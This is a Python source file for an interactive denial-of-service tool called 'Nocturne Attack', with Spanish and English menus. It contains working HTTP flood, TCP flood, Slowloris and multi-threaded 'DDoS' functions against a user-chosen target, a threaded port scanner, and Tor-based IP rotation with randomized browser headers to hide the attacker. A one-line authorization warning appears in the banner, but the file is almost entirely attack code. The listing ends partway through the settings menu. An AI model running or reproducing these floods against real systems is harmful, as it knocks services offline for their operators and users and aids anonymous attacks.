import os
import logging
import time
import socket
import sys
import json
import os.path
import threading
import random
import requests
import stem
import stem.control
from concurrent.futures import ThreadPoolExecutor
from urllib3.util.retry import Retry
from urllib3.exceptions import MaxRetryError
from requests.adapters import HTTPAdapter
from urllib.parse import urlparse


TOR_SOCKS_PORT = 9050  
TOR_CONTROL_PORT = 9051  
TOR_PASSWORD = None  
TOR_NEW_IDENTITY_DELAY = 5  


import urllib3

urllib3.disable_warnings()
logging.captureWarnings(True)





class Config:
    CONFIG_FILE = os.path.expanduser('~/.nocturne_config.json')

    
    _defaults = {
        'LANGUAGE': 'english',
        'EMOJIS': False,
        'MAX_WORKERS': 200,
        'USE_TOR': True,
        'TOR_ROTATION_INTERVAL': 30
    }

    
    @classmethod
    def load_config(cls):
        if os.path.exists(cls.CONFIG_FILE):
            try:
                with open(cls.CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                for key, value in config.items():
                    if key in cls._defaults:
                        setattr(cls, key, value)
            except Exception as e:
                print(f"Error loading config: {e}")
                
                for key, value in cls._defaults.items():
                    setattr(cls, key, value)
        else:
            
            for key, value in cls._defaults.items():
                setattr(cls, key, value)

    
    @classmethod
    def save_config(cls):
        try:
            config = {}
            for key in cls._defaults:
                config[key] = getattr(cls, key, cls._defaults[key])

            with open(cls.CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            print(f"Error saving config: {e}")



Config.load_config()


class TorController:
    def __init__(self, control_port=TOR_CONTROL_PORT, password=TOR_PASSWORD):
        self.control_port = control_port
        self.password = password
        self.controller = None

    def __enter__(self):
        try:
            self.controller = stem.control.Controller.from_port(port=self.control_port)
            if self.password:
                self.controller.authenticate(self.password)
            else:
                self.controller.authenticate()
            return self
        except Exception as e:
            print(f"Error connecting to Tor control port: {e}")
            return None

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.controller:
            self.controller.close()

    def new_identity(self):
        """Solicita una nueva identidad de Tor (nodo de salida)."""
        if not self.controller:
            print("Error: Controlador Tor no inicializado")
            return False

        try:
            
            self.controller.signal(stem.Signal.NEWNYM)

            
            wait_time = max(self.controller.get_newnym_wait() or 5, 5)
            print(f"Rotando IP. Esperando {wait_time} segundos...")
            time.sleep(wait_time)

            
            old_ip = self.get_current_ip()
            time.sleep(1)
            new_ip = self.get_current_ip()

            if old_ip and new_ip and old_ip != new_ip:
                print(f"IP rotada exitosamente: {old_ip} -> {new_ip}")
                return True
            else:
                print("Advertencia: No se pudo verificar el cambio de IP")
                return False

        except Exception as e:
            print(f"Error al rotar la identidad: {e}")
            return False

    def get_current_ip(self, session=None):
        """Obte """
        try:
            if session is None:
                session = self.get_tor_session()
            return session.get('https://api.ipify.org').text
        except Exception as e:
            print(f"Error getting IP: {e}")
            return None

    @classmethod
    def get_tor_session(cls):
        """Crea una sesión requests que usa Tor con configuración mejorada."""
        session = requests.session()

        
        session.proxies = {
            'http': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}',
            'https': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}'
        }

        
        session.timeout = 30

        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })

        
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"]
        )

        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        return session


class Translator:
    def __init__(self):
        self.messages = {  
            "spanish": {
                "settings_title": "CONFIGURACIÓN",
                "current_language": "Idioma actual",
                "use_tor": "Usar Tor",
                "yes": "Sí",
                "no": "No",
                "back_to_menu": "Volver al menú principal",
                "select_option": "Seleccione una opción",
                "enabled": "activado",
                "disabled": "desactivado",
                "banner": "HERRAMIENTA DE PRUEBAS DDOS, DOS, HTTP, TCP, SLOWLORIS, PORT SCANNER",
                "warning": "ADVERTENCIA: Usa solo en sistemas con autorización explícita",
                "warning_legal": "El mal uso de esta herramienta puede ser ilegal",
                "enter_target": "Ingresa URL o IP del objetivo",
                "select_attack": "SELECCIONA EL TIPO DE ATAQUE",
                "port_scan": "Escaneo de Puertos",
                "http_flood": "HTTP Flood",
                "tcp_flood": "TCP Flood",
                "slowloris": "Slowloris Attack",
                "ddos_sim": "DDoS",
                "option": "Opción (1-5)",
                "start_port": "Puerto inicial (default 1)",
                "end_port": "Puerto final (default 1000)",
                "num_requests": "Número de requests",
                "delay": "Delay entre requests (default 0.1)",
                "target_port": "Puerto objetivo",
                "num_connections": "Número de conexiones",
                "message": "Mensaje a enviar (opcional)",
                "num_sockets": "Número de sockets (default 150)",
                "duration": "Duración en segundos (default 60)",
                "restart": "¿Ejecutar otra prueba? (s/n)",
                "exiting": "Saliendo...",
                "error_no_target": "Error: Debes especificar un objetivo",
                "error_invalid_option": "Opción no válida",
                "error_general": "Error",
                "operation_cancelled": "Operación cancelada por el usuario",
                "scanning_ports": "Escaneando puertos {}-{} en {}",
                "port_open": "Puerto {} ABIERTO ({})",
                "scan_complete": "Escaneo completado. Puertos abiertos: {}",
                "starting_http_flood": "Iniciando HTTP Flood a {}",
                "sending_requests": "Enviando {} requests...",
                "request_success": "Request {}/{} - Status: {}",
                "request_warning": "Request {}/{} - Status: {}",
                "request_error": "Request {}/{} - Error: {}",
                "http_summary": "RESUMEN HTTP FLOOD",
                "successful_requests": "Requests exitosos",
                "failed_requests": "Requests fallidos",
                "main_menu": "MENÚ PRINCIPAL",
                "exit": "Salir",
                "port_scan_title": "ESCANEO DE PUERTOS",
                "http_flood_title": "HTTP FLOOD",
                "tcp_flood_title": "TCP FLOOD",
                "slowloris_title": "SLOWLORIS",
                "ddos_title": "ATAQUE DDoS",
                "enter_ip_or_domain": "Ingrese la dirección IP o dominio:",
                "start_port_prompt": "Puerto inicial (predeterminado 1):",
                "end_port_prompt": "Puerto final (predeterminado 1000):",
                "enter_url": "Ingrese la URL objetivo (ej: http://ejemplo.com):",
                "num_requests_prompt": "Número de peticiones:",
                "delay_prompt": "Tiempo entre peticiones en segundos (predeterminado 0.1):",
                "enter_ip": "Ingrese la dirección IP objetivo:",
                "port_prompt": "Puerto objetivo:",
                "num_connections_prompt": "Número de conexiones:",
                "message_prompt": "Mensaje a enviar (opcional):",
                "num_sockets_prompt": "Número de sockets (predeterminado 150):",
                "duration_prompt": "Duración en segundos (predeterminado 60):",
                "scan_completed": "Escaneo completado. Puertos abiertos: {}",
                "starting_attack": "Iniciando ataque a {}",
                "app_terminated": "Aplicación terminada por el usuario",
                "critical_error": "Error crítico",
                "total_time": "Tiempo total",
                "requests_second": "Requests/segundo",
                "starting_tcp_flood": "Iniciando TCP Flood a {}:{}",
                "establishing_connections": "Estableciendo {} conexiones...",
                "connection_established": "Conexión {}: Establecida (Activas: {})",
                "connection_error_send": "Conexión {}: Error enviando - {}",
                "connection_failed": "Conexión {}: Falló - {}",
                "tcp_summary": "RESUMEN TCP FLOOD",
                "successful_connections": "Conexiones exitosas",
                "starting_slowloris": "Iniciando Slowloris a {}",
                "configuring_sockets": "Configurando {} sockets...",
                "sockets_connected": "{}/{} sockets conectados",
                "sockets_active": "{} sockets conectados y manteniendo conexiones...",
                "press_stop": "Presiona Ctrl+C para detener el ataque",
                "sockets_active_count": "Sockets activos: {}/{}",
                "all_sockets_closed": "Todos los sockets se han cerrado",
                "attack_stopped": "Ataque detenido por el usuario",
                "sockets_closed": "{} sockets cerrados",
                "socket_error": "Error en socket {}: {}",
                "starting_ddos": "Iniciando ataque DDoS a {} por {} segundos",
                "starting_workers": "Iniciando ataque con múltiples workers...",
                "worker_progress": "Worker {}: {} requests enviados",
                "time_elapsed": "Tiempo transcurrido: {}s, Requests: {} (~{}/s)",
                "attack_interrupted": "Ataque interrumpido",
                "ddos_summary": "RESUMEN DDoS",
                "total_requests": "Total requests",
                "result": "RESULTADO: {} puertos abiertos: {}"
            },
            "english": {
                "settings_title": "SETTINGS",
                "current_language": "Current language",
                "use_tor": "Use Tor",
                "yes": "Yes",
                "no": "No",
                "back_to_menu": "Back to main menu",
                "select_option": "Select an option",
                "enabled": "enabled",
                "disabled": "disabled",
                "banner": "LOAD TESTING DDOS, DOS, HTTP, TCP, SLOWLORIS, PORT SCANNER",
                "warning": "WARNING: Use only on systems with explicit authorization",
                "warning_legal": "Misuse of this tool may be illegal",
                "enter_target": "Enter target URL or IP",
                "select_attack": "SELECT ATTACK TYPE",
                "port_scan": "Port Scan",
                "http_flood": "HTTP Flood",
                "tcp_flood": "TCP Flood",
                "slowloris": "Slowloris Attack",
                "ddos_sim": "DDoS (Multiple techniques)",
                "option": "Option (1-5)",
                "start_port": "Start port (default 1)",
                "end_port": "End port (default 1000)",
                "num_requests": "Number of requests",
                "delay": "Delay between requests (default 0.1)",
                "target_port": "Target port",
                "num_connections": "Number of connections",
                "message": "Message to send (optional)",
                "num_sockets": "Number of sockets (default 150)",
                "duration": "Duration in seconds (default 60)",
                "restart": "Run another test? (y/n)",
                "exiting": "Exiting...",
                "error_no_target": "Error: You must specify a target",
                "error_invalid_option": "Invalid option",
                "error_general": "Error",
                "operation_cancelled": "Operation cancelled by user",
                "scanning_ports": "Scanning ports {}-{} on {}",
                "port_open": "Port {} OPEN ({})",
                "scan_complete": "Scan completed. Open ports: {}",
                "starting_http_flood": "Starting HTTP Flood to {}",
                "sending_requests": "Sending {} requests...",
                "request_success": "Request {}/{} - Status: {}",
                "request_warning": "Request {}/{} - Status: {}",
                "request_error": "Request {}/{} - Error: {}",
                "http_summary": "HTTP FLOOD SUMMARY",
                "successful_requests": "Successful requests",
                "failed_requests": "Failed requests",
                "main_menu": "MAIN MENU",
                "exit": "Exit",
                "port_scan_title": "PORT SCAN",
                "http_flood_title": "HTTP FLOOD",
                "tcp_flood_title": "TCP FLOOD",
                "slowloris_title": "SLOWLORIS",
                "ddos_title": "DDoS ATTACK",
                "enter_ip_or_domain": "Enter IP address or domain:",
                "start_port_prompt": "Start port (default 1):",
                "end_port_prompt": "End port (default 1000):",
                "enter_url": "Enter target URL (e.g., http://example.com):",
                "num_requests_prompt": "Number of requests:",
                "delay_prompt": "Time between requests in seconds (default 0.1):",
                "enter_ip": "Enter target IP address:",
                "port_prompt": "Target port:",
                "num_connections_prompt": "Number of connections:",
                "message_prompt": "Message to send (optional):",
                "num_sockets_prompt": "Number of sockets (default 150):",
                "duration_prompt": "Duration in seconds (default 60):",
                "scan_completed": "Scan completed. Open ports: {}",
                "starting_attack": "Starting attack to {}",
                "app_terminated": "Application terminated by user",
                "critical_error": "Critical error",
                "total_time": "Total time",
                "requests_second": "Requests/second",
                "starting_tcp_flood": "Starting TCP Flood to {}:{}",
                "establishing_connections": "Establishing {} connections...",
                "connection_established": "Connection {}: Established (Active: {})",
                "connection_error_send": "Connection {}: Send error - {}",
                "connection_failed": "Connection {}: Failed - {}",
                "tcp_summary": "TCP FLOOD SUMMARY",
                "successful_connections": "Successful connections",
                "starting_slowloris": "Starting Slowloris to {}",
                "configuring_sockets": "Configuring {} sockets...",
                "sockets_connected": "{}/{} sockets connected",
                "sockets_active": "{} sockets connected and maintaining connections...",
                "press_stop": "Press Ctrl+C to stop attack",
                "sockets_active_count": "Active sockets: {}/{}",
                "all_sockets_closed": "All sockets have been closed",
                "attack_stopped": "Attack stopped by user",
                "sockets_closed": "{} sockets closed",
                "socket_error": "Socket {} error: {}",
                "starting_ddos": "Starting DDoS attack to {} for {} seconds",
                "starting_workers": "Starting attack with multiple workers...",
                "worker_progress": "Worker {}: {} requests sent",
                "time_elapsed": "Time elapsed: {}s, Requests: {} (~{}/s)",
                "attack_interrupted": "Attack interrupted",
                "ddos_summary": "DDoS SUMMARY",
                "total_requests": "Total requests",
                "result": "RESULT: {} open ports: {}"
            }
        }

    def get(self, key):
        lang = getattr(Config, 'LANGUAGE', 'english')
        return self.messages.get(lang, {}).get(key, self.messages['english'].get(key, key))



t = Translator()


def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)







def get_random_banner():
    banners = [
        
        r'''
     .:'           NOCTURNE ATTACK            `:.
     ::'                                      `::
     :: :.      .:!!.            .:!!.      .: ::
      `:. `:.    !::!          !::!    .:'  .:'
       `::. `::  !:::'!.      .!':::!  ::' .::'
           `::.`::.  `!:'`:::::'':!'  .::'.::'
            `:.  `::::'  `!!'  '::::'   ::'
            :'*:::.  .:'  !!  `:.  .:::*`:
            :: HHH::.   ` !! '   .::HHH ::
           ::: `H TH::.  `!!  .::HT H' :::
           ::..  `THHH:`:   :':HHHT'  ..::
           `::      `T: `. .' :T'      ::'
             `:. .   :  >  <  :   . .:'
               `::'    \    /    `::'
                :'  .`. \__/ .'.  `:
                 :' ::.       .:: `:
                 :' `:::     :::' `:
                  `.  ``     ''  .'
                   :`...........':
                   ` :`.     .': '
                    `:  `"""'  :'   @Nocturne
        ''',
        
        r'''
    ███╗   ██╗ ██████╗  ██████╗████████╗██╗   ██╗██████╗ ███╗   ██╗███████╗
    ████╗  ██║██╔═══██╗██╔════╝╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██╔════╝
    ██╔██╗ ██║██║   ██║██║        ██║   ██║   ██║██████╔╝██╔██╗ ██║█████╗  
    ██║╚██╗██║██║   ██║██║        ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══╝  
    ██║ ╚████║╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║  ██║██║ ╚████║███████╗
    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
    ======================================================================
        ''',
        
        r'''
    ╔╦╗╔═╗ ╔═╗╔╦╗╦ ╦╔═╗╔╗╔╔╦╗  ╔═╗╔╦╗╔═╗╔═╗╔╦╗
    ║║║╠═╣ ║   ║ ║ ║║ ║║║║ ║║  ╠═╣ ║║║╣ ║   ║ 
    ╩ ╩╩ ╩ ╚═╝ ╩ ╚═╝╚═╝╝╚╝═╩╝  ╩ ╩═╩╝╚═╝╚═╝ ╩ 
    =========================================
    ''',
        
        r'''
    ░▒▓███████▓▒░ ▒█████   ▒█████  ▄▄▄█████▓
    ░▒▓█   ▓███▄▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒
    ░▒███  ▓██▓  ▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░
    ░▒▓█  ░██▒  ░██   █▀ ▒██   ██░░ ▓██▓ ░ 
    ░░▒████▓▓  ░▒█████▓ ░ ████▓▒░  ▒██▒ ░ 
    ░ ▒░▒░▒░  ░▒▓▒ ▒ ▒ ░ ▒░▒░▒░   ▒ ░░   
      ░ ▒ ▒░  ░░▒░ ░ ░   ░ ▒ ▒░     ░    
    ░ ░ ░ ▒    ░░░ ░ ░ ░ ░ ░ ▒    ░      
        ░ ░      ░         ░ ░           
    ===============================
    '''
    ]
    return random.choice(banners)


def print_banner():
    
    print(get_random_banner())


def display_menu():
    """Display interactive menu "segun es interactivo jeje"""
    print("\n" + "=" * 60)
    print(f" {t.get('banner')}")
    print("=" * 60)
    print(f"️  {t.get('warning')}")
    print(f"️  {t.get('warning_legal')}")
    print("=" * 60)


def restart_program():
    """Reinicia el programa para aplicar los cambios de configuración"""
    python = sys.executable
    os.execl(python, python, *sys.argv)


def get_language_selection():
    """Obtiene la selección de idioma del usuario"""
    print("\nSelect language / Selecciona idioma:")
    print("1. English")
    print("2. Español")
    choice = input("Choice / Opción (1-2): ").strip()

    if choice == '2':
        Config.LANGUAGE = "spanish"
        Config.EMOJIS = False
    else:
        Config.LANGUAGE = "english"
        Config.EMOJIS = True  


def format_message(message):
    """Format message with or without emojis based on configuration"""
    if Config.EMOJIS:
        return message
    
    emoji_map = {
        '🔍': '[SCAN]', '✅': '[OK]', '🎯': '[TARGET]', '🌊': '[FLOOD]',
        '🚀': '[START]', '⚠️': '[WARN]', '❌': '[ERROR]', '📊': '[STATS]',
        '⏱️': '[TIME]', '📈': '[RATE]', '🌐': '[NETWORK]', '🔗': '[CONN]',
        '📦': '[PACKET]', '🐌': '[SLOW]', '🔧': '[CONFIG]', '📡': '[SOCKET]',
        '⏸️': '[PAUSE]', '💥': '[EXPLOSION]', '🛑': '[STOP]', '🔒': '[LOCK]',
        '🛠️': '[TOOL]', '🎲': '[CHOICE]', '🔢': '[NUMBER]', '💬': '[MESSAGE]',
        '🔄': '[RESTART]', '👋': '[EXIT]'
    }
    for emoji, replacement in emoji_map.items():
        message = message.replace(emoji, replacement)
    return message


def port_scan(host, start_port=1, end_port=1000):
    """Enhanced port scanning"""
    print(format_message(t.get('scanning_ports').format(start_port, end_port, host)))
    open_ports = []

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((host, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    print(format_message(t.get('port_open').format(port, service)))
                    return port
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=Config.MAX_WORKERS) as executor:
        results = executor.map(scan_port, range(start_port, end_port + 1))
        open_ports = [port for port in results if port is not None]

    print(format_message(t.get('scan_complete').format(len(open_ports))))
    return open_ports


def http_flood(target_url, num_requests, delay=0.1):
    """Enhanced HTTP Flood attack"""
    print(format_message(t.get('starting_http_flood').format(target_url)))

    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
    ]

    success_count = 0
    failed_count = 0

    def send_request(request_num):
        nonlocal success_count, failed_count
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }

            response = requests.get(target_url, headers=headers, timeout=10, verify=False)
            if response.status_code < 400:
                success_count += 1
                print(format_message(t.get('request_success').format(request_num, num_requests, response.status_code)))
            else:
                failed_count += 1
                print(format_message(t.get('request_warning').format(request_num, num_requests, response.status_code)))

        except Exception as e:
            failed_count += 1
            error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
            print(format_message(t.get('request_error').format(request_num, num_requests, error_msg)))

    print(format_message(t.get('sending_requests').format(num_requests)))
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(send_request, range(1, num_requests + 1))

    end_time = time.time()
    total_time = end_time - start_time

    print(f"\n{t.get('http_summary')}:")
    print(f"{t.get('successful_requests')}: {success_count}")
    print(f"{t.get('failed_requests')}: {failed_count}")
    print(f"{t.get('total_time')}: {total_time:.2f} seconds")
    print(f"{t.get('requests_second')}: {num_requests / total_time:.2f}")

    return success_count


def tcp_flood(target_ip, target_port, num_connections, message):
    """Enhanced TCP Flood attack"""
    print(format_message(t.get('starting_tcp_flood').format(target_ip, target_port)))

    if not message:
        message = "TCP Flood Test Packet"
    if isinstance(message, str):
        message = message.encode()

    connections_active = 0
    lock = threading.Lock()

    def create_connection(conn_id):
        nonlocal connections_active
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((target_ip, target_port))

            with lock:
                connections_active += 1
            print(format_message(t.get('connection_established').format(conn_id, connections_active)))

            
            packet_count = 0
            while packet_count < 100:  
                try:
                    packet_msg = message + f" [Conn:{conn_id} Packet:{packet_count}]".encode()
                    s.send(packet_msg)
                    packet_count += 1
                    time.sleep(0.3)
                except Exception as e:
                    print(format_message(t.get('connection_error_send').format(conn_id, e)))
                    break

            s.close()
            with lock:
                connections_active -= 1
            return True

        except Exception as e:
            print(format_message(t.get('connection_failed').format(conn_id, e)))
            return False

    print(format_message(t.get('establishing_connections').format(num_connections)))
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=num_connections) as executor:
        results = list(executor.map(create_connection, range(1, num_connections + 1)))

    end_time = time.time()
    successful_connections = sum(results)

    print(f"\n{t.get('tcp_summary')}:")
    print(f"{t.get('successful_connections')}: {successful_connections}/{num_connections}")
    print(f"{t.get('total_time')}: {end_time - start_time:.2f} seconds")

    return successful_connections


def slowloris_attack(target_url, num_sockets=150):
    """Enhanced Slowloris attack"""
    print(format_message(t.get('starting_slowloris').format(target_url)))

    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'

    sockets = []
    print(format_message(t.get('configuring_sockets').format(num_sockets)))

    
    for i in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))

            
            headers = [
                f"GET {path} HTTP/1.1\r\n",
                f"Host: {host}\r\n",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                "Content-Length: 1000000\r\n",
                "X-a: "
            ]

            for header in headers:
                s.send(header.encode())
                time.sleep(0.1)

            sockets.append(s)
            if (i + 1) % 50 == 0:
                print(format_message(t.get('sockets_connected').format(i + 1, num_sockets)))

        except Exception as e:
            print(format_message(t.get('socket_error').format(i + 1, e)))
            break

    print(format_message(t.get('sockets_active').format(len(sockets))))
    print(format_message(t.get('press_stop')))

    try:
        cycle = 0
        while sockets and cycle < 1000:
            cycle += 1
            active_sockets = len(sockets)

            for i, s in enumerate(sockets[:]):
                try:
                    
                    s.send(f"b\r\n".encode())
                    time.sleep(15)
                except Exception as e:
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass

            if active_sockets != len(sockets):
                print(format_message(t.get('sockets_active_count').format(len(sockets), num_sockets)))

            if not sockets:
                print(format_message(t.get('all_sockets_closed')))
                break

    except KeyboardInterrupt:
        print(f"\n{t.get('attack_stopped')}")
    finally:
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
        print(format_message(t.get('sockets_closed').format(len(sockets))))


def ddos_attack(target_url, duration=60):
    """Simulated DDoS attack with multiple techniques"""
    print(format_message(t.get('starting_ddos').format(target_url, duration)))

    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    parsed = urlparse(target_url)
    host = parsed.hostname

    stop_attack = False
    requests_sent = 0

    def attack_worker(worker_id):
        nonlocal requests_sent
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]

        while not stop_attack:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }

                response = requests.get(target_url, headers=headers, timeout=5, verify=False)
                requests_sent += 1
                if requests_sent % 100 == 0:
                    print(format_message(t.get('worker_progress').format(worker_id, requests_sent)))

            except Exception:
                pass

    print(format_message(t.get('starting_workers')))
    start_time = time.time()

    
    workers = []
    for i in range(10):
        worker = threading.Thread(target=attack_worker, args=(i + 1,))
        worker.daemon = True
        worker.start()
        workers.append(worker)

    
    try:
        while time.time() - start_time < duration:
            time.sleep(1)
            elapsed = time.time() - start_time
            print(format_message(
                t.get('time_elapsed').format(int(elapsed), requests_sent, f"{requests_sent / elapsed:.1f}")))
    except KeyboardInterrupt:
        print(f"\n{t.get('attack_interrupted')}")

    stop_attack = True
    end_time = time.time()

    print(f"\n{t.get('ddos_summary')}:")
    print(f"{t.get('total_requests')}: {requests_sent}")
    print(f"{t.get('total_time')}: {end_time - start_time:.2f} seconds")
    print(f"{t.get('requests_second')}: {requests_sent / (end_time - start_time):.2f}")


def interactive_mode():
    """Modo interactivo con menú."""
    
    print_banner()

    
    get_language_selection()

    
    os.system('clear' if os.name == 'posix' else 'cls')
    print_banner()

    
    target = input(f"{t.get('enter_target')}: ").strip()
    if not target:
        print(t.get('error_no_target'))
        return

    
    print("\n" + t.get('select_attack'))
    print("1. " + t.get('port_scan'))
    print("2. " + t.get('http_flood'))
    print("3. " + t.get('tcp_flood'))
    print("4. " + t.get('slowloris'))
    print("5. " + t.get('ddos_sim'))

    choice = input(f"\n{t.get('option')}: ").strip()

    try:
        if choice == '1':
            start_port = int(input(f"{t.get('start_port')}: ") or 1)
            end_port = int(input(f"{t.get('end_port')}: ") or 1000)
            open_ports = port_scan(target, start_port, end_port)
            print(f"\n{t.get('result').format(len(open_ports), open_ports)}")

        elif choice == '2':
            num_requests = int(input(f"{t.get('num_requests')}: "))
            delay = float(input(f"{t.get('delay')}: ") or 0.1)
            http_flood(target, num_requests, delay)

        elif choice == '3':
            port = int(input(f"{t.get('target_port')}: "))
            num_conn = int(input(f"{t.get('num_connections')}: "))
            message = input(f"{t.get('message')}: ")
            tcp_flood(target, port, num_conn, message)

        elif choice == '4':
            num_sockets = int(input(f"{t.get('num_sockets')}: ") or 150)
            slowloris_attack(target, num_sockets)

        elif choice == '5':
            duration = int(input(f"{t.get('duration')}: ") or 60)
            ddos_attack(target, duration)

        else:
            print(t.get('error_invalid_option'))

    except KeyboardInterrupt:
        print(f"\n{t.get('operation_cancelled')}")
    except Exception as e:
        print(f"{t.get('error_general')}: {e}")

    
    answer = input(f"\n{t.get('restart')}: ").strip().lower()
    if answer in ['s', 'si', 'y', 'yes']:
        restart_program()
    else:
        print(t.get('exiting'))


def main():
    """Función principal con menú interactivo."""
    
    Config.load_config()

    
    print_banner()

    
    get_language_selection()

    
    os.system('clear' if os.name == 'posix' else 'cls')
    print_banner()

    while True:
        try:
            
            print("\n=== " + t.get('main_menu') + " ===")
            print("1. " + t.get('port_scan'))
            print("2. " + t.get('http_flood'))
            print("3. " + t.get('tcp_flood'))
            print("4. " + t.get('slowloris'))
            print("5. " + t.get('ddos_sim'))
            print("6. " + t.get('settings_title'))
            print("0. " + t.get('exit'))

            opcion = input("\n>> ").strip()

            if opcion == '0':
                print(f"\n{t.get('exiting')}")
                break

            elif opcion == '1':
                
                print("\n=== " + t.get('port_scan_title') + " ===")
                target = input(t.get('enter_ip_or_domain') + " ").strip()
                start_port = input(t.get('start_port_prompt') + " ").strip() or "1"
                end_port = input(t.get('end_port_prompt') + " ").strip() or "1000"

                try:
                    open_ports = port_scan(target, int(start_port), int(end_port))
                    print("\n[+] " + t.get('scan_completed').format(open_ports))
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif opcion == '2':
                
                print("\n=== " + t.get('http_flood_title') + " ===")
                target = input(t.get('enter_url') + " ").strip()
                num_requests = input(t.get('num_requests_prompt') + " ").strip()
                delay = input(t.get('delay_prompt') + " ").strip() or "0.1"

                try:
                    print("\n[+] " + t.get('starting_attack').format(target))
                    http_flood(target, int(num_requests), float(delay))
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif opcion == '3':
                
                print("\n=== " + t.get('tcp_flood_title') + " ===")
                target = input(t.get('enter_ip') + " ").strip()
                port = input(t.get('port_prompt') + " ").strip()
                num_conn = input(t.get('num_connections_prompt') + " ").strip()
                message = input(t.get('message_prompt') + " ").strip() or "X" * 1024

                try:
                    print("\n[+] " + t.get('starting_tcp_flood').format(target, port))
                    tcp_flood(target, int(port), int(num_conn), message)
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif opcion == '4':
                
                print("\n=== " + t.get('slowloris_title') + " ===")
                target = input(t.get('enter_url') + " ").strip()
                num_sockets = input(t.get('num_sockets_prompt') + " ").strip() or "150"

                try:
                    print("\n[+] " + t.get('starting_attack').format(target))
                    slowloris_attack(target, int(num_sockets))
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif opcion == '5':
                
                print("\n=== " + t.get('ddos_title') + " ===")
                target = input(t.get('enter_url') + " ").strip()
                duration = input(t.get('duration_prompt') + " ").strip() or "60"

                try:
                    print("\n[+] " + t.get('starting_attack').format(target))
                    ddos_attack(target, int(duration))
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif opcion == '6':
                
                while True:
                    print(f"\n=== {t.get('settings_title')} ===")
                    print(f"1. {t.get('current_language')}: {t.get(Config.LANGUAGE)}")
                    print(f"2. {t.get('use_tor')}: {t.get('yes' if Config.USE_TOR else 'no')}")
                    print(f"0. {t.get('back_to_menu')}")

                    config_opcion = input(f"\n{t.get('select_option')} >> ").strip()

                    if config_opcion == '0':
                        break

                    elif config_opcion == '1':
                        get_language_selection()
                        break  

                    elif config_opcion == '2':
                        Config.USE_TOR = not Config.USE_TOR
